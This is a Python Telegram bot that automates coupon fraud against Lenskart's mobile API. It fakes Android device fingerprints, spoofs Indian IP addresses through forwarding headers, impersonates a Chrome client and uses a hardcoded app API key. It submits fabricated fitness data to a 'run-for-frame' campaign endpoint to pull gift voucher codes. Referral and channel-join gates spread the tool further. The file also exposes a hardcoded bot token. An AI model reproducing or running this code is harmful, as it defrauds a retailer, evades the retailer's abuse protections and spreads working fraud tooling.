#!/usr/bin/env python3
"""
LENSKART PRO - TELEGRAM CLOUD BOT (Railway Final Build V5.3 - HTML Parse Fix)
Features: Daily Limits, 5 Referrals for 30m VIP, God Mode Admin, Indian IP Spoofing, UI Buttons, Crash-Proof
"""

import telebot
from telebot import types
import json
import random
import time
import uuid
import hashlib
import base64
import os
import html # 🚨 NAYA IMPORT TELEGRAM ERROR FIX KE LIYE
from datetime import datetime
from curl_cffi import requests

# ==========================================
# 🚨 BOT CONFIGURATION
# ==========================================
BOT_TOKEN = "8860940593:AAFQVyXXU6MHS0OCpLZZ7wEVc33m-PO_IDI"
ADMIN_CHAT_ID = 6860106371

bot = telebot.TeleBot(BOT_TOKEN)
bot_info = bot.get_me()
BOT_USERNAME = bot_info.username

user_sessions = {}
DB_FILE = "users_db.json"
LEADERBOARD_FILE = "leaderboard.json"

REQUIRED_CHATS = [
    {"name": "Rose Khudka Group", "url": "https://t.me/rosekhudkabanaya", "id": "@rosekhudkabanaya"},
    {"name": "Leak Method Free", "url": "https://t.me/leakmethodfree", "id": "@leakmethodfree"},
    {"name": "Sabki Jay Ho Khush", "url": "https://t.me/sabkijayhokhush", "id": "@sabkijayhokhush"}
]

def check_membership(user_id):
    if user_id == ADMIN_CHAT_ID: return True
    for chat in REQUIRED_CHATS:
        try:
            status = bot.get_chat_member(chat['id'], user_id).status
            if status in ['left', 'kicked']: return False
        except Exception: return False
    return True

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

def check_user_limit(user_id):
    if user_id == ADMIN_CHAT_ID: return True, "Admin"
    data = load_db()
    user = data.get(str(user_id), {})
    today = datetime.now().strftime("%Y-%m-%d")
    
    vip_until = user.get("vip_until", 0)
    if time.time() < vip_until: return True, f"VIP Active ({int((vip_until - time.time()) / 60)} mins left)"
        
    if user.get("last_date", "") != today or user.get("used_today", 0) < 1: return True, "Daily Allowed"
    return False, "Limit Exceeded"

def record_usage(user_id):
    if user_id == ADMIN_CHAT_ID: return
    data = load_db()
    uid = str(user_id)
    today = datetime.now().strftime("%Y-%m-%d")
    if uid not in data: data[uid] = {"used_today": 0, "last_date": today, "referrals": 0, "vip_until": 0}
    user = data[uid]
    if user.get("last_date") != today: user.update({"used_today": 0, "last_date": today})
    if time.time() > user.get("vip_until", 0): user["used_today"] += 1
    save_db(data)

def add_referral(referrer_id, new_user_id):
    referrer_id, new_user_id = str(referrer_id), str(new_user_id)
    if referrer_id == new_user_id: return
    data = load_db()
    if referrer_id not in data: data[referrer_id] = {"used_today": 0, "last_date": "", "referrals": 0, "vip_until": 0}
    if new_user_id not in data:
        data[referrer_id]["referrals"] += 1
        data[new_user_id] = {"used_today": 0, "last_date": "", "referrals": 0, "vip_until": 0}
        if data[referrer_id]["referrals"] >= 5:
            data[referrer_id].update({"referrals": 0, "vip_until": time.time() + 1800})
            try: bot.send_message(int(referrer_id), "🎉 <b>BOOM! 30 MINS UNLIMITED VIP UNLOCKED!</b>", parse_mode="HTML")
            except: pass
    save_db(data)

def get_leaderboard():
    if os.path.exists(LEADERBOARD_FILE):
        try:
            with open(LEADERBOARD_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def update_score(user_id, name):
    user_id = str(user_id)
    data = get_leaderboard()
    if user_id not in data: data[user_id] = {"name": name, "score": 0}
    data[user_id]["score"] += 1
    data[user_id]["name"] = name 
    with open(LEADERBOARD_FILE, "w") as f: json.dump(data, f, indent=4)

BRANDS = ["xiaomi", "realme", "samsung", "oneplus", "vivo", "motorola", "iqoo"]
MODELS = {"xiaomi": ["Mi 11X", "2201116PI"], "samsung": ["SM-G998B", "SM-S918B"], "oneplus": ["LE2115", "CPH2447"]}
ANDROID_VERSIONS = ["12", "13", "14"]

def generate_indian_ip():
    return f"{random.choice([103, 106, 122, 157])}.{random.randint(10, 250)}.{random.randint(10, 250)}.{random.randint(10, 250)}"

class LenskartFakeDevice:
    def __init__(self, phone: str):
        self.phone = phone
        self.brand = random.choice(BRANDS)
        self.model = random.choice(MODELS.get(self.brand, ["RMX3031"]))
        self.android_version = random.choice(ANDROID_VERSIONS)
        self.udid = uuid.uuid4().hex[:16]
        self.advertising_id = str(uuid.uuid4())
        self.build_version = f"TP1A.220905.00{random.randint(1,9)}"
        self.session_token = None
        self.s = requests.Session(impersonate="chrome110")
        self.fake_ip = generate_indian_ip()
        self.x_assertion = self.generate_x_assertion()
        
    def generate_x_assertion(self):
        data = f"{self.udid}:{self.advertising_id}:{self.brand}:{self.model}:{self.phone}"
        assertion = base64.b64encode(hashlib.sha256(data.encode()).digest()).decode('utf-8').replace('+', '-').replace('/', '_')
        while len(assertion) < 100: assertion += random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_")
        return assertion[:100]
        
    def base_headers(self):
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json; charset=UTF-8",
            "api_key": "valyoo123",
            "x-api-client": "android",
            "x-app-version": "5.8.2 (260713001)",
            "appversion": "5.8.2 (260713001)",
            "X-Build-Version": "260713001",
            "x-country-code": "IN",
            "x-accept-language": "en",
            "udid": self.udid,
            "uniqueId": self.advertising_id[:16],
            "brand": self.brand,
            "model": self.model,
            "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.model} Build/{self.build_version})",
            "X-Forwarded-For": self.fake_ip,
            "X-Real-IP": self.fake_ip
        }
        if self.phone:
            h["x-customer-phone"] = self.phone
            h["x-customer-phone-code"] = "91"
        if self.session_token: h["x-session-token"] = self.session_token
        if self.x_assertion: h["x-assertion"] = self.x_assertion
        return h

    def req(self, method, path, body=None):
        url = f"https://api-gateway.juno.lenskart.com{path}"
        try:
            time.sleep(random.uniform(0.1, 0.5))
            if method == "POST": return self.s.post(url, headers=self.base_headers(), json=body, timeout=20)
            else: return self.s.get(url, headers=self.base_headers(), timeout=20)
        except Exception as e:
            class FakeResponse:
                status_code = 500
                text = f"NetworkException: {str(e)}"
                def json(self): return {}
            return FakeResponse()

def get_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🎁 Claim Coupon", callback_data="claim"),
               types.InlineKeyboardButton("👥 My Referrals", callback_data="ref"),
               types.InlineKeyboardButton("🏆 Leaderboard", callback_data="lead"))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if len(message.text.split()) > 1: add_referral(message.text.split()[1], user_id)
    if not check_membership(user_id):
        markup = types.InlineKeyboardMarkup()
        for chat in REQUIRED_CHATS: markup.add(types.InlineKeyboardButton(text=f"📢 Join {chat['name']}", url=chat['url']))
        markup.add(types.InlineKeyboardButton(text="✅ I Have Joined", callback_data="check_join"))
        bot.send_message(message.chat.id, "⚠️ <b>ACCESS DENIED</b>\nPlease join our channels first!", parse_mode="HTML", reply_markup=markup)
        return
    bot.send_message(message.chat.id, f"🚀 <b>Welcome {message.from_user.first_name}!</b>\nSelect an option below:", parse_mode="HTML", reply_markup=get_main_menu())

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    chat_id, user_id = call.message.chat.id, call.from_user.id
    if call.data == "check_join":
        if check_membership(user_id): bot.send_message(chat_id, "🎉 <b>Thanks for joining!</b>", parse_mode="HTML", reply_markup=get_main_menu())
        else: bot.answer_callback_query(call.id, "❌ Not joined all channels!", show_alert=True)
    elif call.data == "claim":
        allowed, reason = check_user_limit(user_id)
        if not allowed:
            bot.edit_message_text("❌ <b>Limit Exceeded!</b>", chat_id, call.message.message_id, parse_mode="HTML", reply_markup=get_main_menu())
            return
        user_sessions[chat_id] = {"step": "wait_for_phone"}
        bot.edit_message_text(f"✅ <b>Status: {reason}</b>\n📱 <b>Send 10-digit Number:</b>", chat_id, call.message.message_id, parse_mode="HTML")

@bot.message_handler(func=lambda message: True)
def process_steps(message):
    chat_id, user_id, text = message.chat.id, message.from_user.id, message.text.strip()
    step = user_sessions.get(chat_id, {}).get("step")

    if step == "wait_for_phone":
        if not text.isdigit() or len(text) != 10:
            bot.send_message(chat_id, "❌ Invalid Number!")
            return
        msg = bot.send_message(chat_id, "⏳ <i>Injecting Stealth IPs & Bypassing WAF...</i>", parse_mode="HTML")
        try:
            device = LenskartFakeDevice(text)
            r = device.req("POST", "/v2/sessions", {})
            if not r or r.status_code != 200:
                # 🚨 FIX: HTML ESCAPE APPLIED HERE TO PREVENT TELEGRAM CRASH
                safe_error = html.escape(r.text[:250]) if hasattr(r, 'text') else "No response"
                bot.edit_message_text(f"❌ <b>Lenskart Blocked Railway IP.</b>\n⚠️ Status: {r.status_code if hasattr(r, 'status_code') else 'N/A'}\n🛠 Response: <code>{safe_error}</code>", chat_id, msg.message_id, parse_mode="HTML")
                del user_sessions[chat_id]
                return
                
            device.session_token = r.json().get("result", {}).get("id")
            r = device.req("POST", "/v3/customers/sendOtp", {"phoneCode": "+91", "telephone": device.phone})
            if r and r.status_code == 200:
                user_sessions[chat_id] = {"step": "wait_for_otp", "device": device}
                bot.edit_message_text("✅ OTP sent!\n🔑 <b>Enter OTP:</b>", chat_id, msg.message_id, parse_mode="HTML")
            else:
                bot.edit_message_text("❌ Failed to send OTP.", chat_id, msg.message_id)
                del user_sessions[chat_id]
        except Exception as e:
            # 🚨 FIX: HTML ESCAPE APPLIED HERE TOO
            safe_e = html.escape(str(e))
            bot.edit_message_text(f"❌ <b>System Error:</b>\n<code>{safe_e}</code>", chat_id, msg.message_id, parse_mode="HTML")
            if chat_id in user_sessions: del user_sessions[chat_id]
            
    elif step == "wait_for_otp":
        if not text.isdigit() or len(text) < 4: return bot.send_message(chat_id, "❌ Invalid OTP Format!")
        device = user_sessions[chat_id]["device"]
        msg = bot.send_message(chat_id, "⏳ <i>Verifying...</i>", parse_mode="HTML")
        try:
            r = device.req("POST", "/v2/customers/authenticate/mobile", {"code": text, "phoneCode": "+91", "telephone": device.phone})
            if not r or r.status_code != 200:
                bot.edit_message_text("❌ Incorrect OTP!", chat_id, msg.message_id)
                del user_sessions[chat_id]
                return
            res = r.json().get("result", {})
            device.session_token = res.get("token")
            payload = [{"distance": 0.0, "steps": 0 if i < 6 else 30000, "timestamp": int(time.time() * 1000) - (6-i) * 86400000} for i in range(7)]
            r = device.req("POST", "/v2/customers/bff/campaign/eligibility?campaignName=run-for-frame", payload)
            if r and r.status_code == 200 and r.json().get("result", {}).get("giftVoucher"):
                bot.edit_message_text(f"🎉 <b>COUPON EXTRACTED!</b>\n🎫 <b>Code:</b> <code>{r.json()['result']['giftVoucher']}</code>", chat_id, msg.message_id, parse_mode="HTML")
            else:
                bot.edit_message_text("⚠️ No reward eligible.", chat_id, msg.message_id)
        except Exception as e:
            bot.edit_message_text(f"❌ <b>Error:</b> <code>{html.escape(str(e))}</code>", chat_id, msg.message_id, parse_mode="HTML")
        finally:
            if chat_id in user_sessions: del user_sessions[chat_id]

if __name__ == "__main__":
    bot.remove_webhook()
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
